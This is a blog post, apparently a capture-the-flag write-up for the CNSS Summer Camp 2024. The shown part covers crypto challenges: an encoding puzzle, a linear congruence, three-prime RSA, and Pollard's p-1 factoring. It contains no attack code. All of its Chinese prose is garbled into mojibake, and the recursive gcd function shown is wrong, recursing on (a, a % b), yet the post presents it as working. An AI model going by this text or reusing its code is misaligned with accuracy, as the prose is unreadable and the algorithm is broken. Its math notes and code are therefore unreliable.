<!doctype html>
<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta><title>CNSS Summer-Camp 2024 wp - Aununo&#039;s Blog</title><link rel="manifest" href="/manifest.json"><meta name="application-name" content="Aununo&#039;s Blog"><meta name="msapplication-TileImage" content="/img/favicon.svg"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-title" content="Aununo&#039;s Blog"><meta name="apple-mobile-web-app-status-bar-style" content="default"><meta name="description" content="CTFï¼ˆCapture The Flagï¼Œå¤ºæ——èµ›ï¼‰èµ·æºäº 1996 å¹´ DEFCON å…¨çƒé»‘å®¢å¤§ä¼šï¼Œæ˜¯ç½‘ç»œå®‰å…¨çˆ±å¥½è€…ä¹‹é—´çš„ç«æŠ€æ¸¸æˆã€‚å‚èµ›è€…é€šè¿‡å„ç§æ‰‹æ®µæ”»ç ´ç³»ç»Ÿã€è§£å†³è°œé¢˜ï¼Œè·å–ã€Œflagã€ã€‚ æƒ³æå‰äº†è§£ CTF ä»¥åŠå„ä¸ªæ–¹å‘ï¼Œå¯ä»¥å‚è§ CTF Wikiã€‚                        CNSSåœ¨2024å¹´8æœˆçš„CTFå¤ä»¤è¥â›±ï¸é¢˜ç›®ï¼Œè®°å½•ä¸€ä¸‹è‡ªå·±æ‰“çš„wpã€‚        Problem"><meta property="og:type" content="blog"><meta property="og:title" content="CNSS Summer-Camp 2024 wp"><meta property="og:url" content="http://aununo.xyz/2024/08/07/CNSS-Summer-Camp-2024%20wp/"><meta property="og:site_name" content="Aununo&#039;s Blog"><meta property="og:description" content="CTFï¼ˆCapture The Flagï¼Œå¤ºæ——èµ›ï¼‰èµ·æºäº 1996 å¹´ DEFCON å…¨çƒé»‘å®¢å¤§ä¼šï¼Œæ˜¯ç½‘ç»œå®‰å…¨çˆ±å¥½è€…ä¹‹é—´çš„ç«æŠ€æ¸¸æˆã€‚å‚èµ›è€…é€šè¿‡å„ç§æ‰‹æ®µæ”»ç ´ç³»ç»Ÿã€è§£å†³è°œé¢˜ï¼Œè·å–ã€Œflagã€ã€‚ æƒ³æå‰äº†è§£ CTF ä»¥åŠå„ä¸ªæ–¹å‘ï¼Œå¯ä»¥å‚è§ CTF Wikiã€‚                        CNSSåœ¨2024å¹´8æœˆçš„CTFå¤ä»¤è¥â›±ï¸é¢˜ç›®ï¼Œè®°å½•ä¸€ä¸‹è‡ªå·±æ‰“çš„wpã€‚        Problem"><meta property="og:locale" content="en_US"><meta property="og:image" content="http://aununo.xyz/images/%E7%BC%A9%E7%95%A5%E5%9B%BE/dd.png"><meta property="article:published_time" content="2024-08-07T03:20:58.000Z"><meta property="article:modified_time" content="2025-07-14T05:30:42.810Z"><meta property="article:author" content="Aununo Gan"><meta property="article:tag" content="CNSS"><meta property="article:tag" content="CTF"><meta property="twitter:card" content="summary"><meta property="twitter:image:src" content="http://aununo.xyz/images/%E7%BC%A9%E7%95%A5%E5%9B%BE/dd.png"><script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://aununo.xyz/2024/08/07/CNSS-Summer-Camp-2024%20wp/"},"headline":"CNSS Summer-Camp 2024 wp","image":["http://aununo.xyz/images/%E7%BC%A9%E7%95%A5%E5%9B%BE/dd.png"],"datePublished":"2024-08-07T03:20:58.000Z","dateModified":"2025-07-14T05:30:42.810Z","author":{"@type":"Person","name":"Aununo Gan"},"publisher":{"@type":"Organization","name":"Aununo's Blog","logo":{"@type":"ImageObject","url":"http://aununo.xyz/img/logo.svg"}},"description":"CTFï¼ˆCapture The Flagï¼Œå¤ºæ——èµ›ï¼‰èµ·æºäº 1996 å¹´ DEFCON å…¨çƒé»‘å®¢å¤§ä¼šï¼Œæ˜¯ç½‘ç»œå®‰å…¨çˆ±å¥½è€…ä¹‹é—´çš„ç«æŠ€æ¸¸æˆã€‚å‚èµ›è€…é€šè¿‡å„ç§æ‰‹æ®µæ”»ç ´ç³»ç»Ÿã€è§£å†³è°œé¢˜ï¼Œè·å–ã€Œflagã€ã€‚ æƒ³æå‰äº†è§£ CTF ä»¥åŠå„ä¸ªæ–¹å‘ï¼Œå¯ä»¥å‚è§ CTF Wikiã€‚                        CNSSåœ¨2024å¹´8æœˆçš„CTFå¤ä»¤è¥â›±ï¸é¢˜ç›®ï¼Œè®°å½•ä¸€ä¸‹è‡ªå·±æ‰“çš„wpã€‚        Problem"}</script><link rel="canonical" href="http://aununo.xyz/2024/08/07/CNSS-Summer-Camp-2024%20wp/"><link rel="icon" href="/img/favicon.svg"><link rel="stylesheet" href="https://use.fontawesome.com/releases/v6.0.0/css/all.css"><link data-pjax rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@11.7.0/styles/atom-one-light.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Ubuntu:wght@400;600&amp;family=Source+Code+Pro"><link data-pjax rel="stylesheet" href="/css/default.css"><style>body>.footer,body>.navbar,body>.section{opacity:0}</style><!--!--><!--!--><!--!--><!--!--><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@1.10.0/dist/css/lightgallery.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/justifiedGallery@3.8.1/dist/css/justifiedGallery.min.css"><!--!--><!--!--><!--!--><!--!--><style>.pace{-webkit-pointer-events:none;pointer-events:none;-webkit-user-select:none;-moz-user-select:none;user-select:none}.pace-inactive{display:none}.pace .pace-progress{background:#3273dc;position:fixed;z-index:2000;top:0;right:100%;width:100%;height:2px}</style><script src="https://cdn.jsdelivr.net/npm/pace-js@1.2.4/pace.min.js"></script><!--!--><!--!--><!-- hexo injector head_end start --><script>
  (function () {
      function switchTab() {
          if (!location.hash) {
            return;
          }

          const id = '#' + CSS.escape(location.hash.substring(1));
          const $tabMenu = document.querySelector(`.tabs a[href="${id}"]`);
          if (!$tabMenu) {
            return;
          }

          const $tabMenuContainer = $tabMenu.parentElement.parentElement;
          Array.from($tabMenuContainer.children).forEach($menu => $menu.classList.remove('is-active'));
          Array.from($tabMenuContainer.querySelectorAll('a'))
              .map($menu => document.getElementById($menu.getAttribute("href").substring(1)))
              .forEach($content => $content.classList.add('is-hidden'));

          if ($tabMenu) {
              $tabMenu.parentElement.classList.add('is-active');
          }
          const $activeTab = document.querySelector(id);
          if ($activeTab) {
              $activeTab.classList.remove('is-hidden');
          }
      }
      switchTab();
      window.addEventListener('hashchange', switchTab, false);
  })();
  </script><!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head><body class="is-3-column"><nav class="navbar navbar-main"><div class="container navbar-container"><div class="navbar-brand justify-content-center"><a class="navbar-item navbar-logo" href="/"><img src="/img/logo.svg" alt="Aununo&#039;s Blog" height="28"></a></div><div class="navbar-menu"><div class="navbar-start"><a class="navbar-item" href="/">Home</a><a class="navbar-item" href="/archives">Archives</a><a class="navbar-item" href="/categories">Categories</a><a class="navbar-item" href="/tags">Tags</a><a class="navbar-item" href="/about">About</a></div><div class="navbar-end"><a class="navbar-item" target="_blank" rel="noopener" title="Download on GitHub" href="https://csdiy.wiki/"><i class="fa-solid fa-arrow-right"></i></a><a class="navbar-item is-hidden-tablet catalogue" title="Catalogue" href="javascript:;"><i class="fas fa-list-ul"></i></a><a class="navbar-item search" title="Search" href="javascript:;"><i class="fas fa-search"></i></a></div></div></div></nav><section class="section"><div class="container"><div class="columns"><div class="column order-2 column-main is-8-tablet is-8-desktop is-9-widescreen"><div class="card"><article class="card-content article" role="article"><h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal"><i class="fas fa-angle-double-right"></i>CNSS Summer-Camp 2024 wp</h1><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><i class="far fa-calendar-alt">Â </i><time dateTime="2024-08-07T03:20:58.000Z" title="2024-08-07T03:20:58.000Z">2024-08-07</time></span><span class="level-item is-hidden-mobile"><i class="far fa-calendar-check">Â </i><time dateTime="2025-07-14T05:30:42.810Z" title="2025-07-14T05:30:42.810Z">2025-07-14</time></span><span class="level-item"><i class="far fa-folder-open has-text-grey"></i>Â <a class="link-muted" href="/categories/CTF/">CTF</a></span><span class="level-item"><i class="far fa-clock"></i>Â  43 minutes read (About 6405 words)</span></div></div><div class="content"><p><strong>CTF</strong>ï¼ˆCapture The Flagï¼Œå¤ºæ——èµ›ï¼‰èµ·æºäº 1996 å¹´ DEFCON å…¨çƒé»‘å®¢å¤§ä¼šï¼Œæ˜¯ç½‘ç»œå®‰å…¨çˆ±å¥½è€…ä¹‹é—´çš„ç«æŠ€æ¸¸æˆã€‚å‚èµ›è€…é€šè¿‡å„ç§æ‰‹æ®µæ”»ç ´ç³»ç»Ÿã€è§£å†³è°œé¢˜ï¼Œè·å–ã€Œ<strong>flag</strong>ã€ã€‚ æƒ³æå‰äº†è§£ CTF ä»¥åŠå„ä¸ªæ–¹å‘ï¼Œå¯ä»¥å‚è§ <a target="_blank" rel="noopener" href="https://ctf-wiki.org/">CTF Wiki</a>ã€‚</p>
<article class="message message-immersive is-info">
    <div class="message-body">
        <i class="fas fa-info-circle mr-2"></i>
        CNSSåœ¨2024å¹´8æœˆçš„CTFå¤ä»¤è¥â›±ï¸é¢˜ç›®ï¼Œè®°å½•ä¸€ä¸‹è‡ªå·±æ‰“çš„wpã€‚
    </div>
</article>

<p><strong>Problems Covered:</strong></p>
<ul>
<li>Crypto</li>
<li>Web</li>
<li>Bin</li>
<li>Misc</li>
</ul>
<p>OK, now, letâ€™s Capture The Flag! </p>
<span id="more"></span>

<h1 id="ğŸ”¢Crypto"><a href="#ğŸ”¢Crypto" class="headerlink" title="ğŸ”¢Crypto"></a>ğŸ”¢Crypto</h1><h2 id="ğŸ”®cnsså¨˜çš„è°œè¯­"><a href="#ğŸ”®cnsså¨˜çš„è°œè¯­" class="headerlink" title="ğŸ”®cnsså¨˜çš„è°œè¯­"></a>ğŸ”®cnsså¨˜çš„è°œè¯­</h2><p>cnsså¨˜ä¿¡æ‰‹å†™ä¸‹å‡ ä¸²æ„ä¹‰ä¸æ˜çš„è°œè¯­ï¼Œä½ å¯ä»¥çŒœå‡ºå…¶ä¸­çš„å«ä¹‰å—ï¼Ÿ</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag <span class="comment">## secret is a local file, flag is unknown to you. Try to find it.</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">type</span>(flag) == <span class="built_in">str</span></span><br><span class="line"></span><br><span class="line">flag = flag.encode()</span><br><span class="line">length = <span class="built_in">len</span>(flag)</span><br><span class="line"><span class="keyword">assert</span> length % <span class="number">4</span> == <span class="number">0</span></span><br><span class="line">L = length // <span class="number">4</span></span><br><span class="line"></span><br><span class="line">secret1 = bytes_to_long(flag[:L])</span><br><span class="line">secret2 = flag[L:<span class="number">2</span>*L].<span class="built_in">hex</span>()</span><br><span class="line">secret3 = <span class="built_in">bin</span>(<span class="built_in">int</span>(flag[<span class="number">2</span>*L:<span class="number">3</span>*L].<span class="built_in">hex</span>(), <span class="number">16</span>))</span><br><span class="line">secret4 = base64.b64encode(flag[<span class="number">3</span>:L])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;secret1 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;secret2 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;secret3 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;secret4 = &#125;</span>&quot;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">secret1 = 30772543014919602267414633191</span></span><br><span class="line"><span class="string">secret2 = &#x27;bc96e7a081e698afe5ada620&#x27;</span></span><br><span class="line"><span class="string">secret3 = &#x27;0b10000110111001001111001011100000111010001101111001000001110011110011010100001001110011110101100&#x27;</span></span><br><span class="line"><span class="string">secret4 = b&#x27;rOS4gOatpeOAgiF9&#x27;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>å¸¸è§ç¼–ç ï¼ŒæŠŠåè¿›åˆ¶ã€åå…­è¿›åˆ¶ã€äºŒè¿›åˆ¶å’Œ base64 åˆ†åˆ«è½¬åŒ–ä¸ºå­—èŠ‚ï¼Œæ‹¼èµ·æ¥å utf-8 è½¬æˆ string å°±èƒ½è¿˜åŸå‡º<a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/%F0%9F%94%AEcnss%E5%A8%98%E7%9A%84%E8%B0%9C%E8%AF%AD.py">flag</a>ã€‚</p>
<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>  cnss{å­¦ä¼šç¼–ç æ˜¯å­¦ Crypto çš„ç¬¬ä¸€æ­¥ã€‚!} </div> </article>

<h2 id="ğŸ¬æ°´é¾™åŸ"><a href="#ğŸ¬æ°´é¾™åŸ" class="headerlink" title="ğŸ¬æ°´é¾™åŸ"></a>ğŸ¬æ°´é¾™åŸ</h2><p>æ¥šå¤©åƒé‡Œæ¸…ç§‹ï¼Œæ°´éšå¤©å»ç§‹æ— é™…ã€‚é¥å²‘è¿œç›®ï¼ŒçŒ®æ„ä¾›æ¨ï¼Œç‰ç°ªèºé«»ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line">p = <span class="number">4873905926740615531018463661385452170898784133203367799135441645830937750628221985822405430005703937197770247575076559744236744538228018031486049820173674</span></span><br><span class="line">g = <span class="number">2593552830271406523114019117101950399687742243315195843514987700785182656087120211241524521448500935829478648514527037446437576680778419567396094750508622</span></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(m):</span><br><span class="line">    c = (c + g) % p</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c =  &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">c = 3431276814099066030808269572939347769420622699894452016972504433264414095698239241816562301198442206498226641308404105790355301176892588988847042699636406</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>è§£ä¸€ä¸ª<a target="_blank" rel="noopener" href="https://oi-wiki.org/math/number-theory/linear-equation/">çº¿æ€§åŒä½™æ–¹ç¨‹</a>ï¼š<br>$$<br>c \equiv mg\pmod{p}<br>$$</p>
<ul>
<li>ç”¨é€†å…ƒæ±‚è§£ï¼š</li>
</ul>
<p>é¦–å…ˆç”¨ Euclid ç®—æ³•<strong>é€’å½’</strong>è®¡ç®— $g$ å’Œ $p$ çš„æœ€å¤§å…¬çº¦æ•° $gcd(g, p)$ï¼š</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">gcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a</span><br><span class="line">    <span class="keyword">return</span> gcd(a, a % b)</span><br><span class="line"><span class="comment"># gcd(g, p) = 23027835966762406</span></span><br></pre></td></tr></table></figure>

<p>æ–¹ç¨‹ä¸¤è¾¹åŒæ—¶é™¤ä»¥ $gcd$ï¼Œåªéœ€æ‰¾åˆ° $gâ€™$ çš„é€†å…ƒå³å¯ã€‚<br>$$<br>m\equiv câ€™gâ€™\pmod{pâ€™}<br>$$</p>
<ul>
<li>ç”¨ Extend Euclid alg æ±‚è§£ï¼šå‘ä¸‹é€’ï¼Œå‘ä¸Šå½’ã€‚</li>
</ul>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">exgcd</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    d, x, y = exgcd(b, a % b)</span><br><span class="line">    <span class="keyword">return</span> d, y, x - (a // b) * y</span><br></pre></td></tr></table></figure>

<p>è§£å‡º $m$ å°±èƒ½è¿˜åŸå‡º <a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/%F0%9F%90%AC%E6%B0%B4%E9%BE%99%E5%90%9F.py">flag</a>ã€‚</p>
<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>cnss{Subgroup @nd Eucl1d algOrithm 1s eleg4nt.} </div> </article>

<h2 id="ğŸŒ”åœç®—å­"><a href="#ğŸŒ”åœç®—å­" class="headerlink" title="ğŸŒ”åœç®—å­"></a>ğŸŒ”åœç®—å­</h2><p>æƒŠèµ·å´å›å¤´ï¼Œæœ‰æ¨æ— äººçœã€‚æ‹£å°½å¯’æä¸è‚¯æ –ï¼Œå¯‚å¯æ²™æ´²å†·ã€‚</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p, q, r = getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>), getPrime(<span class="number">512</span>)</span><br><span class="line">n = p * q * r</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;p =&#x27;</span>, p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;q =&#x27;</span>, q)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;n =&#x27;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;c =&#x27;</span>, c)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">p = 12253096079262730693787845304459770181159272160708761390419517461435886798119494973936186382645490774511179747402693066192362104144553287739427091488849987</span></span><br><span class="line"><span class="string">q = 9656184899794050073098614505490788837141112476549205418072011388278372195682566976277132351856116300104728124405389485440262266612903835574949734938773879</span></span><br><span class="line"><span class="string">n = 1068394811940475700113916170772008310607904879176073274337669322446687936907143981238893756179197975634434673229920275765973807209412891205884402965483756254507691419368528133959132303476165747992107800736918701005971552264644185146124560027884795936191839406241406301141310602020436434278421529178345240902508007101551941438277539664839258109542374751444222500079818129540895166090788487787028178055561786822480872065405947357363186718845196587434430898650662917</span></span><br><span class="line"><span class="string">c = 364812620179131273680130240148084836403846027393384913159162092631491386521136431985815726041640268869899250546875572473450702105133851945618590296616284218872409897353796638895758963083075264218372930102765065661636950920355098372841435042642748593167374414989630427181232399218196685772309403529745406119979371226428026631723070867224675860939203796555567951762311063010081727524747799375832842589314306700599116049075415601108806973017635507910763925927172362</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>



<article class="message is-info"> <div class="message-header">  æ¬§æ‹‰å®šç†  </div> <div class="message-body"> è‹¥ $n$ï¼Œ$a$ ä¸ºæ­£æ•´æ•°ä¸” $gcd(a, n)=1$ï¼Œåˆ™$a^{\phi(n)}\equiv1\pmod{n}$ã€‚   </div> </article> 

<p>ç”±äº $c\equiv m^e\pmod{n}$ï¼Œè®¾ $d$ ä¸º $e$ æ¨¡ $\phi(n)$ çš„é€†å…ƒï¼Œå³<br>$$<br>ed\equiv 1\pmod{\phi(n)}<br>$$<br>åˆ™æœ‰<br>$$<br>c^d\equiv m^{ed}\equiv m^{1+k\phi(p)}\equiv m\pmod{n}<br>$$<br>å› æ­¤ï¼Œåˆ©ç”¨ä¸‰ç´ æ•° RSA å³å¯è§£å‡º <a target="_blank" rel="noopener" href="https://github.com/Aununo/hi/blob/main/ctf_crypto/cnss/%F0%9F%8C%94%E5%8D%9C%E7%AE%97%E5%AD%90.py">flag</a>ã€‚</p>
<article class="message message-immersive is-primary"> <div class="message-body"> <i class="fas fa-info-circle mr-2"></i>cnss{1t is similar to two-prime RSA....}</div> </article>

<h2 id="ğŸ Fun-factoring"><a href="#ğŸ Fun-factoring" class="headerlink" title="ğŸ Fun_factoring"></a>ğŸ Fun_factoring</h2><p>Have fun in the factoring!</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> next_prime</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag1, flag2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">init</span>():</span><br><span class="line">    primes = []</span><br><span class="line">    p = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(primes) &lt; <span class="number">100</span>:</span><br><span class="line">        p = next_prime(p)</span><br><span class="line">        primes.append(<span class="built_in">int</span>(p))</span><br><span class="line">    <span class="keyword">return</span> primes</span><br><span class="line"></span><br><span class="line">primes = init()</span><br><span class="line">p1 = getPrime(<span class="number">256</span>)</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    q1 = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> q1.bit_length() &lt; <span class="number">255</span>:</span><br><span class="line">        q1 *= random.choice(primes)</span><br><span class="line">    q1 = q1 + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(q1):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">n1 = p1 * q1</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">m1 = bytes_to_long(flag1)</span><br><span class="line">c1 = <span class="built_in">pow</span>(m1, e, n1)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;n1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c1 = &#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">m2 = bytes_to_long(flag2)</span><br><span class="line">p2 = getPrime(<span class="number">256</span>)</span><br><span class="line">q2 = getPrime(<span class="number">256</span>)</span><br><span class="line">n2 = p2 * q2</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2, e, n2)</span><br><span class="line"></span><br><span class="line">phi = (p2 - <span class="number">1</span>) * (q2 - <span class="number">1</span>)</span><br><span class="line">e2 = getPrime(<span class="number">256</span>)</span><br><span class="line">d2 = inverse(e2, phi)</span><br><span class="line"></span><br><span class="line">hint1 = getPrime(<span class="number">256</span>) * n2</span><br><span class="line">hint2 = e2 * d2</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;c2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hint1 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;hint2 = &#125;</span>&#x27;</span>)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">n1 = 29993156790273796411588637755401407649619741972315831791586727944419911570896819043688187483218756247767784823799572993962152654560761989054087817767687901</span></span><br><span class="line"><span class="string">c1 = 28308885699728621592812918494757273712938007912315485487807230648420711341284570451708049371754826651903406663574768899937862287581243099737368091309807825</span></span><br><span class="line"><span class="string">c2 = 3677242432073556679040222440039877927024312077564452145956625214187804614184186227277646425370459616386984491952553180136037741092781602470053045143802537</span></span><br><span class="line"><span class="string">hint1 = 397340046977096077577115578026599912881304442662450049334426974861677656259439266980515145452369301652618056238525786266286451780972189318240092026572582216328286841448920434798083168400087303822060653407466964485682775061825982767</span></span><br><span class="line"><span class="string">hint2 = 42319976894927564843833810567252442522907372281560684051129782019144211533194692653447095916384084531450449319697685128778953472384491084162072476640254892049041007337641419872550411941455264025858397584349456909103991157799852081</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆ<code>init()</code>å‡½æ•°ç”Ÿæˆäº†å‰100ä¸ªç´ æ•°ï¼Œ$q_1-1$ <a target="_blank" rel="noopener" href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_module_attack/#p-q-n">å…‰æ»‘</a>ï¼Œè€ƒè™‘ä½¿ç”¨ <strong>Pollardâ€™s p - 1 algorithm</strong>ã€‚</p>
<p>æ ¹æ® Fermatâ€™s little theoremï¼šè‹¥ $p$ æ˜¯ $N$ çš„ç´ å› å­ï¼Œä¸” $a$ ä¸ $p$ äº’ç´ ï¼Œåˆ™<br>$$<br>a^{p-1}\equiv 1\pmod{p}<br>$$</p>
<p>$$<br>a^{t(p-1)}-1^t&#x3D;kp<br>$$</p>
<article class="message is-info"> <div class="message-header">  Pollard's p-1 algorithm  </div> <div class="message-body">  è‹¥ $p$ æ˜¯ä¸€ä¸ª B-smooth numberï¼Œåˆ™å­˜åœ¨<br> $$M = \prod_{q\leq B} q^{\lfloor \log_q B \rfloor}$$ ä½¿å¾— $(p-1)|M.$ </div> </article> 

<p>è®¡ç®— $gcd(a^M-1,N)$ã€‚å¦‚æœç»“æœä¸ä¸º $1$ æˆ– $N$ï¼Œé‚£ä¹ˆå°±æˆåŠŸåˆ†è§£äº† $N$ã€‚</p>
<blockquote>
<p>ä¸æ˜¯å¾ˆæ‡‚è¿™ä¸ªç»“æ„â€¦</p>
</blockquote>
